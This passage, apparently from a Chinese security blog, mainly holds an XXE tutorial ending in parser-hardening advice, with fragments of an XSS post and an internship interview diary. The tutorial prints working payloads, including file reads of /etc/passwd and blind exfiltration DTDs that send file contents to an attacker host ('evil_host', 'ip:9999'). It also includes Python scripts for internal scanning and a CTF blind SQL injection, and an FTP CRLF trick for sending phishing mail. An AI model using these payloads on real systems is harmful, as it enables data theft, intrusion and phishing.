攻击是指，通过执行恶意脚本，以实现窃取用户登陆态、劫持会话等目的的攻击方式。恶意脚本的输入源有，Cook","title":"XSS漏洞基础"},{"content":"XXE - 外部实体注入（Xml External Entity Injection） 基本信息与概念 定义 XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，\u0026hellip;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，\u0026hellip;），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。\n在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。\nXML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; //这一行是 XML 文档定义 \u0026lt;!DOCTYPE message [ \u0026lt;!ELEMENT message (receiver ,sender ,header ,msg)\u0026gt; \u0026lt;!ELEMENT receiver (#PCDATA)\u0026gt; \u0026lt;!ELEMENT sender (#PCDATA)\u0026gt; \u0026lt;!ELEMENT header (#PCDATA)\u0026gt; \u0026lt;!ELEMENT msg (#PCDATA)\u0026gt; 上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写\n1 2 3 4 5 6 \u0026lt;message\u0026gt; \u0026lt;receiver\u0026gt;Myself\u0026lt;/receiver\u0026gt; \u0026lt;sender\u0026gt;Someone\u0026lt;/sender\u0026gt; \u0026lt;header\u0026gt;TheReminder\u0026lt;/header\u0026gt; \u0026lt;msg\u0026gt;This is an amazing book\u0026lt;/msg\u0026gt; \u0026lt;/message\u0026gt; 其实除了在 DTD 中定义元素**（其实就是对应 XML 中的标签）**以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的。比如：\n1 2 3 4 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE xxe [ \u0026lt;!ELEMENT xee ANY \u0026gt; \u0026lt;!ENTITY testMsg \u0026#34;test\u0026#34; \u0026gt;]\u0026gt; 这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 \u0026amp;[entity]; 符号进行引用），那么 XML 就可以写成这样\n1 2 3 4 \u0026lt;creds\u0026gt; \u0026lt;user\u0026gt;\u0026amp;xxe;\u0026lt;/user\u0026gt; \u0026lt;pass\u0026gt;mypass\u0026lt;/pass\u0026gt; \u0026lt;/creds\u0026gt; 我们使用 \u0026amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 \u0026amp;xxe 就会被 \u0026ldquo;test\u0026rdquo; 替换。\n内部与外部实体 实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实际上实体可以从外部的dtd 文件中引用，我们看下面的代码：\n1 2 3 4 5 6 7 8 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE xxe [ \u0026lt;!ELEMENT xxe ANY \u0026gt; \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///c:/test.dtd\u0026#34; \u0026gt;]\u0026gt; //引用的外部的dtd文件 \u0026lt;creds\u0026gt; \u0026lt;user\u0026gt;\u0026amp;file;\u0026lt;/user\u0026gt; \u0026lt;pass\u0026gt;mypass\u0026lt;/pass\u0026gt; \u0026lt;/creds\u0026gt; 这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）\n当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：\n1 \u0026lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”\u0026gt; 这个在我们的攻击中也可以起到和 SYSTEM 一样的作用\n通用实体与参数实体 我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体还可以分成两个派别：通用实体和参数实体\n1.通用实体\n用 \u0026amp;实体名; 引用的实体，在DTD 中定义，在 XML 文档中引用（上面提到的过的就是）\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE updateProfile [\u0026lt;!ENTITY file SYSTEM \u0026#34;file:///c:/windows/win.ini\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;updateProfile\u0026gt; \u0026lt;firstname\u0026gt;Joe\u0026lt;/firstname\u0026gt; \u0026lt;lastname\u0026gt;\u0026amp;file;\u0026lt;/lastname\u0026gt; ... \u0026lt;/updateProfile\u0026gt; 2.参数实体：\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用 (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体 (3)和通用实体一样，参数实体也可以外部引用\n1 2 3 \u0026lt;!ENTITY % an-element \u0026#34;\u0026lt;!ELEMENT mytag (subtag)\u0026gt;\u0026#34;\u0026gt; \u0026lt;!ENTITY % remote-dtd SYSTEM \u0026#34;http://somewhere.example.org/remote.dtd\u0026#34;\u0026gt; %an-element; %remote-dtd; 参数实体在我们 Blind XXE 中起到了至关重要的作用\n实验一：有回显读取本地文件（常规xxe） 这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件\n本地服务器上解析 XML 的 php 代码：\nxml.php\n1 2 3 4 5 6 7 8 \u0026lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds; ?\u0026gt; payload: 将这整段作为 post-data 使用 post 传入服务器即可\n1 2 3 4 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE creds [ \u0026lt;!ENTITY goodies SYSTEM \u0026#34;file:///c:/windows/system.ini\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;creds\u0026gt;\u0026amp;goodies;\u0026lt;/creds\u0026gt; 若文件无特殊符号，则可正常回显\n但若文件含有特殊符号如 \u0026amp; \u0026lt; [ ] \u0026gt; ;呢，如果直接想要导出这些数据，xml在渲染时就会出错。因此，可以使用CDATA包裹文件数据再导出\nCDATA是一种xml的方法，能够将其中的\u0026lt;\u0026gt;[]等字符当作常量输出，但是它无法转义\u0026rsquo;]]\u0026gt;\u0026rsquo;，因为这是他自己的结束标志，就像字符串不能含有\\0字符一样。\n将数据用CDATA包裹，即：\n1 2 3 4 5 6 7 8 \u0026lt;![CDATA[ xxxxxxxx ]]\u0026gt; ------------------------------------- 可以定义三个参数ENTITY，分别代表 % start \u0026#34;\u0026lt;![CDATA[ % datas\t\u0026#34;xxxxxxxx\u0026#34; % end\t\u0026#34;]]\u0026gt;\u0026#34; payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE xxe [ \u0026lt;!ENTITY % dtd SYSTEM \u0026#34;file:///c:/tpl.txt\u0026#34;\u0026gt; //引用的一个外部文件，这个文件也可以存放在一个黑客自己搭建的服务器 %dtd; ]\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt; \u0026amp;payload; \u0026lt;/username\u0026gt; \u0026lt;password\u0026gt; password \u0026lt;/password\u0026gt; \u0026lt;/user\u0026gt; tpl.txt\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!ENTITY % start \u0026#34;\u0026lt;![CDATA[\u0026#34;\u0026gt; \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///c:/xxe.txt\u0026#34;\u0026gt; //这里是需要读取的文件 \u0026lt;!ENTITY % end \u0026#34;]]\u0026gt;\u0026#34;\u0026gt; \u0026lt;!ENTITY payload \u0026#34;%start;%file;%end;\u0026#34;\u0026gt; //拼接了上述定义的参数实体 如此就可读取含有\u0026lt;\u0026gt;[]等特殊字符的文件了\n当然也可以不引用外部文件，直接将迭代定义参数实体即可，但是需要注意的是，被包裹的实体在定义时，双引号需要变为单引号，且需要将\u0026quot;%\u0026ldquo;转义为html实体编码，即\u0026amp;#37;\npayload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE xxe [ \u0026lt;!ENTITY % start \u0026#34;\u0026lt;![CDATA[\u0026#34;\u0026gt; \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///c:/xxe.txt\u0026#34;\u0026gt; \u0026lt;!ENTITY % end \u0026#34;]]\u0026gt;\u0026#34;\u0026gt; \u0026lt;!ENTITY % dtd \u0026#34;\u0026lt;!ENTITY payload \u0026#39;\u0026amp;#37;start;\u0026amp;#37;file;\u0026amp;#37;end;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %dtd; ]\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt; \u0026amp;payload; \u0026lt;/username\u0026gt; \u0026lt;password\u0026gt; password \u0026lt;/password\u0026gt; \u0026lt;/user\u0026gt; 实验二：无回显读取本地敏感文件(Blind OOB XXE) 如果服务器端没有xml回显，那么可以选择将读取的文件上传到攻击者个人服务器\n方式同上，定义参数实体，利用一些协议将文件编码后，传输至攻击者的服务器(使用python http nc查看即可)\n注意 因为包裹实体时，实体的值中不能有 %, 所以将其转成html实体编码 %\ntest.dtd\n1 2 \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;http://ip:9999?p=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; payload：\n1 2 3 4 \u0026lt;!DOCTYPE convert [ \u0026lt;!ENTITY % remote SYSTEM \u0026#34;http://ip/test.dtd\u0026#34;\u0026gt; %remote;%int;%send; ]\u0026gt; 新的思考：\n我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。\n新的利用：\n所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议\n如图所示:\n注意：\n1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35 2.libxml 是 PHP 的 xml 支持\n实验三：HTTP 内网主机探测 我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了\n下面是一个探测脚本的实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import requests import base64 #Origtional XML that the server accepts #\u0026lt;xml\u0026gt; # \u0026lt;stuff\u0026gt;user\u0026lt;/stuff\u0026gt; #\u0026lt;/xml\u0026gt; def build_xml(string): xml = \u0026#34;\u0026#34;\u0026#34;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt;\u0026#34;\u0026#34;\u0026#34; xml = xml + \u0026#34;\\r\\n\u0026#34; + \u0026#34;\u0026#34;\u0026#34;\u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt;\u0026#34;\u0026#34;\u0026#34; xml = xml + \u0026#34;\\r\\n\u0026#34; + \u0026#34;\u0026#34;\u0026#34;\u0026lt;!ENTITY xxe SYSTEM \u0026#34;\u0026#34;\u0026#34; + \u0026#39;\u0026#34;\u0026#39; + string + \u0026#39;\u0026#34;\u0026#39; + \u0026#34;\u0026#34;\u0026#34;\u0026gt;]\u0026gt;\u0026#34;\u0026#34;\u0026#34; xml = xml + \u0026#34;\\r\\n\u0026#34; + \u0026#34;\u0026#34;\u0026#34;\u0026lt;xml\u0026gt;\u0026#34;\u0026#34;\u0026#34; xml = xml + \u0026#34;\\r\\n\u0026#34; + \u0026#34;\u0026#34;\u0026#34; \u0026lt;stuff\u0026gt;\u0026amp;xxe;\u0026lt;/stuff\u0026gt;\u0026#34;\u0026#34;\u0026#34; xml = xml + \u0026#34;\\r\\n\u0026#34; + \u0026#34;\u0026#34;\u0026#34;\u0026lt;/xml\u0026gt;\u0026#34;\u0026#34;\u0026#34; send_xml(xml) def send_xml(xml): headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/xml\u0026#39;} x = requests.post(\u0026#39;http://34.200.157.128/CUSTOM/NEW_XEE.php\u0026#39;, data=xml, headers=headers, timeout=5).text coded_string = x.split(\u0026#39; \u0026#39;)[-2] # a little split to get only the base64 encoded value print coded_string # print base64.b64decode(coded_string) for i in range(1, 255): try: i = str(i) ip = \u0026#39;10.0.0.\u0026#39; + i string = \u0026#39;php://filter/convert.base64-encode/resource=http://\u0026#39; + ip + \u0026#39;/\u0026#39; print string build_xml(string) except: continue 实验四：HTTP 内网主机端口扫描 找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测\n比如我们传入：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data SYSTEM \u0026#34;http://127.0.0.1:515/\u0026#34; [ \u0026lt;!ELEMENT data (#PCDATA)\u0026gt; ]\u0026gt; \u0026lt;data\u0026gt;4\u0026lt;/data\u0026gt; 返回结果：\n1 2 3 4 5 javax.xml.bind.UnmarshalException - with linked exception: [Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException Exception Description: An error occurred unmarshalling the document Internal Exception: ████████████████████████: Connection refused 这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测，设置替换参数为端口即可\n实验五：内网盲注(CTF) 2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：\n首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错\n既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )\n1 /var/www/52dandan.cc/public_html/config.php 拿到第一部分 flag\n1 2 3 4 5 6 \u0026lt;?php define(BASEDIR, \u0026#34;/var/www/52dandan.club/\u0026#34;); define(FLAG_SIG, 1); define(SECRETFILE,\u0026#39;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431\u0026#39;); .... ?\u0026gt; 注意：\n这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php 过滤器的一个压缩的方法\n压缩：echo file_get_contents(\u0026ldquo;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\u0026rdquo;); 解压：echo file_get_contents(\u0026ldquo;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1\u0026rdquo;);\n然后我们考虑内网有没有东西，我们读取\n1 2 /proc/net/arp /etc/host 找到内网的另一台服务器的 ip 地址 192.168.223.18\n拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests url = \u0026#39;http://39.107.33.75:33899/common.php\u0026#39; s = requests.Session() result = \u0026#39;\u0026#39; data = { \u0026#34;name\u0026#34;:\u0026#34;evil_man\u0026#34;, \u0026#34;email\u0026#34;:\u0026#34;testabcdefg@gmail.com\u0026#34;, \u0026#34;comment\u0026#34;:\u0026#34;\u0026#34;\u0026#34;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % dtd SYSTEM \u0026#34;http://evil_host/evil.dtd\u0026#34;\u0026gt; %dtd;]\u0026gt; \u0026#34;\u0026#34;\u0026#34; } for i in range(0,28): for j in range(48,123): f = open(\u0026#39;./evil.dtd\u0026#39;,\u0026#39;w\u0026#39;) payload2 = \u0026#34;\u0026#34;\u0026#34;\u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3\u0026#39;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(\u0026#39;{}\u0026#39;))then(0)else(1)end)-\u0026#39;1\u0026#34;\u0026gt; \u0026lt;!ENTITY % all \u0026#34;\u0026lt;!ENTITY % send SYSTEM \u0026#39;http://evil_host/?result=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %all; %send;\u0026#34;\u0026#34;\u0026#34;.format(\u0026#39;_\u0026#39;*i+chr(j)+\u0026#39;_\u0026#39;*(27-i)) f.write(payload2) f.close() print \u0026#39;test {}\u0026#39;.format(chr(j)) r = s.post(url,data=data) if \u0026#34;Oti3a3LeLPdkPkqKF84xs=\u0026#34; in r.content and chr(j)!=\u0026#39;_\u0026#39;: result += chr(j) print chr(j) break print result 这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解\n实验六：钓鱼： 如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）\nJava支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。\n但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ftp://a%0D%0A EHLO%20a%0D%0A MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A DATA%0D%0A From%3A%20support%40VULNERABLESYSTEM.com%0A To%3A%20victim%40gmail.com%0A Subject%3A%20test%0A %0A test!%0A %0D%0A .%0D%0A QUIT%0D%0A :a@VULNERABLESYSTEM.com:25 当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 ftp://a EHLO a MAIL FROM: \u0026lt;support@VULNERABLESYSTEM.com\u0026gt; RCPT TO: \u0026lt;victim@gmail.com\u0026gt; DATA From: support@VULNERABLESYSTEM.com To: victim@gmail.com Subject: Reset your password We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com . QUIT :support@VULNERABLESYSTEM.com:25 这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。\n真实的 XXE 出现在哪 我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方\n如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）\n那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个\n实例一：模拟情况 示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 POST /vulnerable HTTP/1.1 Host: www.test.com User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: https://test.com/test.html Content-Type: application/xml Content-Length: 294 Cookie: mycookie=cookies; Connection: close Upgrade-Insecure-Requests: 1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;catalog\u0026gt; \u0026lt;core id=\u0026#34;test101\u0026#34;\u0026gt; \u0026lt;author\u0026gt;John, Doe\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;I love XML\u0026lt;/title\u0026gt; \u0026lt;category\u0026gt;Computers\u0026lt;/category\u0026gt; \u0026lt;price\u0026gt;9.99\u0026lt;/price\u0026gt; \u0026lt;date\u0026gt;2018-10-01\u0026lt;/date\u0026gt; \u0026lt;description\u0026gt;XML is the best!\u0026lt;/description\u0026gt; \u0026lt;/core\u0026gt; \u0026lt;/catalog\u0026gt; 我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}\n代表该web服务可以进行xml的类型数据的传输，服务器也会正常接收并处理xml类型。\n此时如果我们传入一个恶意的代码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE GVI [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;catalog\u0026gt; \u0026lt;core id=\u0026#34;test101\u0026#34;\u0026gt; \u0026lt;author\u0026gt;John, Doe\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;I love XML\u0026lt;/title\u0026gt; \u0026lt;category\u0026gt;Computers\u0026lt;/category\u0026gt; \u0026lt;price\u0026gt;9.99\u0026lt;/price\u0026gt; \u0026lt;date\u0026gt;2018-10-01\u0026lt;/date\u0026gt; \u0026lt;description\u0026gt;\u0026amp;xxe;\u0026lt;/description\u0026gt; \u0026lt;/core\u0026gt; \u0026lt;/catalog\u0026gt; 如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回\n1 2 3 4 5 {\u0026#34;error\u0026#34;: \u0026#34;no results for description root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync... 实例二：JSON content-type XXE 正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击\n原始请求和响应： HTTP Request:\n1 2 3 4 5 6 7 POST /netspi HTTP/1.1 Host: someserver.netspi.com Accept: application/json Content-Type: application/json Content-Length: 38 {\u0026#34;search\u0026#34;:\u0026#34;name\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;netspitest\u0026#34;} HTTP Response:\n1 2 3 4 5 HTTP/1.1 200 OK Content-Type: application/json Content-Length: 43 {\u0026#34;error\u0026#34;: \u0026#34;no results for name netspitest\u0026#34;} 现在我们尝试将 Content-Type 修改为 application/xml\n进一步请求和响应： HTTP Request:\n1 2 3 4 5 6 7 POST /netspi HTTP/1.1 Host: someserver.netspi.com Accept: application/json Content-Type: application/xml Content-Length: 38 {\u0026#34;search\u0026#34;:\u0026#34;name\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;netspitest\u0026#34;} HTTP Response:\n1 2 3 4 5 HTTP/1.1 500 Internal Server Error Content-Type: application/json Content-Length: 127 {\u0026#34;errors\u0026#34;:{\u0026#34;errorMessage\u0026#34;:\u0026#34;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\u0026#34;}} 可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击\n最终的请求和响应： HTTP Request:\n1 2 3 4 5 6 7 8 9 10 11 12 POST /netspi HTTP/1.1 Host: someserver.netspi.com Accept: application/json Content-Type: application/xml Content-Length: 288 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE netspi [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;search\u0026gt;name\u0026lt;/search\u0026gt; \u0026lt;value\u0026gt;\u0026amp;xxe;\u0026lt;/value\u0026gt; \u0026lt;/root\u0026gt; HTTP Response:\n1 2 3 4 5 6 7 8 9 HTTP/1.1 200 OK Content-Type: application/json Content-Length: 2467 {\u0026#34;error\u0026#34;: \u0026#34;no results for name root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync.... XXE 如何防御 方案一：使用语言中推荐的禁用外部实体的方法 PHP：\n1 libxml_disable_entity_loader(true); JAVA:\n1 2 3 4 5 6 7 8 DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); .setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;,true); .setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;,false) .setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;,false); Python：\n1 2 from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方案二：手动黑名单过滤(不推荐) 过滤关键词：\n1 \u0026lt;!DOCTYPE、\u0026lt;!ENTITY SYSTEM、PUBLIC 本文原作者 K0rz3n 。文章内容略有删减与修改\n1 https://xz.aliyun.com/t/3357?time__1311=n4%2BxnD0DgGYQwqYq40HpDUhDfxGT%2BALux0K4x\u0026amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-0 ","permalink":"http://3lizabeth.fun/posts/study/xxe_basic/","summary":"XXE - 外部实体注入（Xml External Entity Injection） 基本信息与概念 定义 XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软","title":"XXE漏洞基础"},{"content":"最拷打的一集：甲方 厦门吉比特 实习面经 虽然 vx 通知就说了时长约为一个小时，但是实际上面了十分钟我就觉得可以G了，没想到面试官尽职尽责，要把工作干完，硬是控了我五十分钟，仔细拷打了一番。。。\n0-10分钟 自我介绍。让我没想到的是，“熟悉owasp top 10”也能给自己埋坑。网宿实习，随便提了一嘴。挖洞经历，小洞（后面也被拷打）。 因为自我介绍占了两三分钟，面试官提问很基础的问题也占了点时间，所以头十分钟是拷打得最轻的。主要问了自己之前的经历，挖到什么洞，公司有什么项目，挖洞的数量之类的。这种问题问了只是了解下情况，等后面问owasp，就是拷打的开始。\n10-30分钟 开始细问owasp。大致顺序是“xss -\u0026gt; csrf -\u0026gt; 文件上传 -\u0026gt; sql -\u0026gt; ssrf”。本身对这些漏洞的理解就很浅，至少讲清楚原理、检测、利用、修复是打磕巴+胡言乱语的程度的。 每个漏洞都问原理、利用、修复。 